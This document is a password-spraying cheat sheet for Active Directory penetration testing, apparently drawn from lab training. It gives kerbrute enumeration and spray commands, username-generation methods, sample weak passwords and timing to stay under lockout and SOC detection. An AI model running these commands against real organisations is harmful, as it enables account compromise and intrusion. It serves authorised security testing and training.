# 🌐 Password Spraying Cheat Sheet

> [!info] 🧠 What is Password Spraying?
> 
> Bash
> 
> ```
> Testing ONE common password against MANY different user accounts.
> ```
> 
> 💡 A horizontal authentication attack designed to find weak credentials while completely bypassing account lockout thresholds.

> [!tip] 🕵️ The Lockout Strategy (The Core Trick)
> 
> Bash
> 
> ```
> Keep the volume per user low to stay under detection filters.
> ```
> 
> 💡 Contrast against standard brute-forcing:
> 
> - **Brute-Force:** 1 user $\times$ 100 passwords = **LOCKED ACCOUNT** ❌
>     
> - **Password Spray:** 100 users $\times$ 1 password = **ACTIVE AD FOOTPRINT** ✔
>     

# 🔐 Target List Generation & OSINT

> [!success] 📜 Extract Names from LinkedIn & Public Data
> 
> Bash
> 
> ```
> # Build a targeted, statistically likely username list
> git clone https://github.com/urbanadventurer/username-anarchy.git
> ```
> 
> 💡 Combine OSINT scraped names with standard directory patterns (e.g., `jsmith.txt`).

> [!tip] 🌐 Extract Usernames from Document Metadata
> 
> Bash
> 
> ```
> # Discover hidden formatting layouts left behind by developers in public PDFs
> exiftool target_document.pdf | grep -i "Author"
> ```
> 
> 💡 Document headers often leak internal naming structures, like custom employee GUIDs.

> [!success] 🧾 Programmatic Alphanumeric Username Generation
> 
> Bash
> 
> ```
> for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do
>     echo $x;
> done > alpha_usernames.txt
> ```
> 
> 💡 When corporate layouts utilize predictable 4-character tokens, automate the full keyspace map.

# 🌍 Active Directory User Validation

> [!info] 🔎 Enumerate Valid Accounts via Kerberos
> 
> Bash
> 
> ```
> kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 usernames.txt
> ```
> 
> 💡 Leverages Kerberos pre-authentication states to separate valid accounts from dead ones without triggering bad logon events.

> [!warning] ⚠️ Critical Operational Rule
> 
> Bash
> 
> ```
> DO NOT start spraying until you understand the password policy.
> ```
> 
> 💡 If you cannot map the policy via unauthenticated tools, check with the client or start with a high-cooldown timeline strategy.

# 🔍 Executing the Spray

> [!tip] 🌐 Launching a Sprayer Attack Instance
> 
> Bash
> 
> ```
> kerbrute passwordspray -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 valid_users.txt "Welcome1"
> ```
> 
> 💡 Attacks the entire validated infrastructure directory using a single high-probability password payload string.

> [!success] 🎯 High-Value Targets to Keep in Mind
> 
> Bash
> 
> ```
> Welcome1
> Spring2026!
> Password123
> ```
> 
> 💡 Most corporate environments rely on predictable, seasonal, or company-branded entry combinations.

# 🧬 Pacing and Mitigation Defenses

> [!info] 🔎 Enforce Iteration Cool-Down Delays
> 
> Bash
> 
> ```
> # Example flow: Spray Password #1 -> Sleep 2 Hours -> Spray Password #2
> sleep 7200
> ```
> 
> 💡 Gives the environment’s Active Directory bad login counters enough time to automatically reset to zero.

> [!tip] 🧾 Common AD Default Thresholds
> 
> Bash
> 
> ```
> 5 Bad Attempts  → Account Lockout
> 30-Minute Clock → Automated Auto-Unlock Threshold
> ```
> 
> 💡 Aligning your spray delay window to the reset window ensures zero operational disruption.

# 🧠 Operational Attack Mindset

> [!quote] 🎯 Multi-Tasking Workflow
> 
> Bash
> 
> ```
> What background loops are running? Responder.
> What can I test concurrently? Delayed Password Spray.
> ```
> 
> 💡 Internal penetration testing is heavily time-boxed. Maximize efficiency by running horizontal sprays while network capturing functions.

> [!warning] ⚠️ Beginner Mistake
> 
> Bash
> 
> ```
> Running multiple passwords back-to-back without a time-delay gap
> ```
> 
> ❌ Locks out production users
> 
> ❌ Alerts the Blue Team Security Operations Center (SOC)
> 
> ❌ Disrupts client day-to-day operations

> [!success] ✔ Correct Path to a Foothold
> 
> Bash
> 
> ```
> Extract Data → Enumerate Accounts → Check Policies → Spray Cleanly
> ```

# ⚡ Real-World Attack Flow Diagram

> [!success] 🧠 Foothold Capture Flow
> 
> Bash
> 
> ```
> 1. Scrape metadata & LinkedIn records
> 2. Build explicit format lists
> 3. Perform Kerbrute verification checks
> 4. Filter down to verified active users
> 5. Determine or infer target lockout rules
> 6. Spray target selection with seasonal password payload
> 7. Capture initial low-priv privilege foothold
> ```
> 
> 💡 Transition from zero infrastructure placement to active authenticated domain access.

# 🧩 Mental Model

> [!quote] 🎯 The Attack Trajectory
> 
> Bash
> 
> ```
> RECON → GENERATION → KERBEROS ENUMERATION → TARGET LIST → TIME-MANAGED SPRAY → DOMAIN FOOTHOLD
> ```

> [!tip] 🚀 Pro Tips
> 
> - Always leverage your zero-credential data before escalating noise.
>     
> - Use targeted, single-shot "Hail Mary" sprays if time limits are expiring.
>     
> - Once a single foothold is achieved, dump the domain policy to optimize subsequent attacks.
>     
> - Document execution time logs precisely to match client verification processes.
>     

